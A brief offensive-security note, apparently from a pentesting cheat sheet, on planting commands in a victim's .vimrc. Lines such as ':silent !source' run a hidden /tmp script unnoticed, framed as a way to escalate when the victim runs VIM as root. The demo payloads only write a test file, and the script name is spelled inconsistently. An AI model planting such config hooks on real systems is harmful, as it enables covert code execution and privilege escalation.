VIM config  file is located in .vimrc under the home users directory. 

If we can modify the .vimrc file, we append this to execute a bash command:

```
!touch /tmp/test.txt
```

If we want to be more stealthier, we can use the source command to execute a bash file instead of a single command, here's an example:

```
Append this to .vimrc file:

:silent !source /tmp/.vimrunscript   -> the :silent option is used to evade any posible debugging messages 

Contents of the /tmp/.vrimrunscript file:

#!/bin/bash
echo "We have code execution!" > /tmp/test.txt
```

If our victim runs VIM as root, we can weaponize it using the techinque above.
